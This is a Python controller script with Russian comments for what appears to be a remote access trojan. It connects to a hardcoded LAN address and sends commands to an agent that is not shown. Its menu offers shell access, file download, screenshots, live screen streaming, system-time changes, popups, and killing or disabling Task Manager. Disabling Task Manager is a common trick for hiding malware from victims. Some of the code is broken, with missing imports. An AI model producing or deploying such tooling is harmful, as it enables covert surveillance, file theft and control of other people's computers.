import socket
import os, io
from colorama import Fore, Style, init
import baner
import threading


# Настройки клиента
SERVER_HOST = '192.168.0.97'  # IP второго ПК
SERVER_PORT = 8080             # Тот же порт, что и на сервере

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_HOST, SERVER_PORT))
print("ok")




while True:
    # Ввод команды
    # print("\nПримеры команд:")
    # print("1. create_file - создать текстовый файл на рабочем столе.")
    # print("2. open_calculator - открыть калькулятор.")
    # print("3. list_dir - показать содержимое текущей директории.")
    # print("4. change_dir <путь> - перейти в другую директорию.")
    # print("5. get_cwd - показать текущую директорию.")
    # print("6. get_file <имя_файла> - скачать файл с сервера.")
    # print("7. get_system_info - характеристики ПК")
    # print("8. open_website <URL> - открыть сайт")
    # print("9. uptime - показать время работы системы.")
    # print("10. change_time <время> - изменить системное время (пример: '20 2025-01-12 12:30:00').")
    # print("11. ping <адрес> - выполнить пинг указанного адреса.")
    # print("12. show_message <текст> - показать всплывающее сообщение.")
    # #print("31. screenshot - создать скриншот и сохранить на сервере.")
    # print("0. exit - выйти из программы.")
    # print("w. server_close - принудительно закрыть сервер.")


    

# Инициализация библиотеки colorama
    init(autoreset=True)

    print(Fore.GREEN + Style.BRIGHT + "\nПримеры команд:")
    print(Fore.GREEN + "0. open_cmd - открыть командную строку.")
    print(Fore.GREEN + "1. open_calculator - открыть калькулятор.")
    print(Fore.GREEN + "2. create_file - создать текстовый файл на рабочем столе.")
    print(Fore.GREEN + "3. list_dir - показать содержимое текущей директории.")
    print(Fore.GREEN + "4. change_dir <путь> - перейти в другую директорию.")
    print(Fore.GREEN + "5. get_cwd - показать текущую директорию.")
    print(Fore.GREEN + "6. get_file <имя_файла> - скачать файл с сервера.")
    print(Fore.GREEN + "7. get_system_info - характеристики ПК.")
    print(Fore.GREEN + "8. open_website <URL> - открыть сайт.")
    print(Fore.GREEN + "9. uptime - показать время работы системы.")
    print(Fore.GREEN + "10. change_time <время> - изменить системное время (пример: '20 2025-01-12 12:30:00').")
    print(Fore.GREEN + "11. ping <адрес> - выполнить пинг указанного адреса.")
    print(Fore.GREEN + "12. show_message <текст> - показать всплывающее сообщение.")
    print(Fore.GREEN + "13. screenshot - зделать скриншот.")
    print(Fore.GREEN + "14. task_manager - завершает процес диспетчера задач")
    print(Fore.GREEN + "15. task_manager_disab - не даёт запустить диспитчер задач")
    print(Fore.GREEN + "16. task_manager_enab - включает диспитчер задач")



    #print(Fore.GREEN + "31. screenshot - создать скриншот и сохранить на сервере.")
    print(Fore.GREEN + "exit. - выйти из программы.")
    print(Fore.GREEN + "server_close. - принудительно закрыть сервер.")

    #print(Fore.GREEN "")

#print(Fore.GREEN + "\n")
    
    # print(baner.logo)
    # print(Fore.GREEN + "\n[0] - Начать чат" + "\n[1] - pyvir")
    


    command = input("Введите команду: ").strip()
    print("-")
    client_socket.send(command.encode("utf-8"))
    print("--")


    if command.lower() == 'exit':
        print
        ("Выход из программы.")
        break

    # Обработка специальных команд
    if command.startswith("get_file"):
        response = client_socket.recv(4096).decode("utf-8")
        if response == "FILE_TRANSFER_START":
            file_name = command.split(maxsplit=1)[1]
            with open(file_name, "wb") as file:
                while True:
                    data = client_socket.recv(4096)
                    if b"FILE_TRANSFER_END" in data:
                        file.write(data.replace(b"FILE_TRANSFER_END", b""))
                        break
                    file.write(data)
            print(f"Файл {file_name} сохранен.")
        else:
            print(response)

    elif command.startswith("screenshot"):
        response = client_socket.recv(4096).decode("utf-8")
        if response == "FILE_TRANSFER_START":
            
            
            screenshot_path = os.path.join(os.path.expanduser("~"), "Desktop", "screenshot_client.png")
            with open(screenshot_path, "wb") as file:
                while True:
                    chunk = client_socket.recv(4096)
                    if b"FILE_TRANSFER_END" in chunk:
                        file.write(chunk.replace(b"FILE_TRANSFER_END", b""))
                        break
                    file.write(chunk)
            print(f"Скриншот сохранен на рабочем столе: {screenshot_path}")
        else:
            print(response)

    elif command == "screen":
        print("yes")
        data = b""
        payload_size = struct.calcsize("Q")

        try:
            while True:
                # Получение размера данных
                while len(data) < payload_size:
                    packet = client_socket.recv(4 * 1024)
                    if not packet:
                        break
                    data += packet

                packed_msg_size = data[:payload_size]
                data = data[payload_size:]
                msg_size = struct.unpack("Q", packed_msg_size)[0]

                # Получение самих данных
                while len(data) < msg_size:
                    data += client_socket.recv(4 * 1024)

                frame_data = data[:msg_size]
                data = data[msg_size:]

                # Десериализация данных и отображение
                buffer = pickle.loads(frame_data)
                frame = cv2.imdecode(buffer, cv2.IMREAD_COLOR)

                cv2.imshow("Экран сервера", frame)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
        except Exception as e:
            print(f"Ошибка: {e}")
        finally:
            client_socket.close()
            cv2.destroyAllWindows()



    # Получение результата
    result = client_socket.recv(4096).decode("utf-8")
    print("Результат выполнения:\n", result)
    
    

client_socket.close()
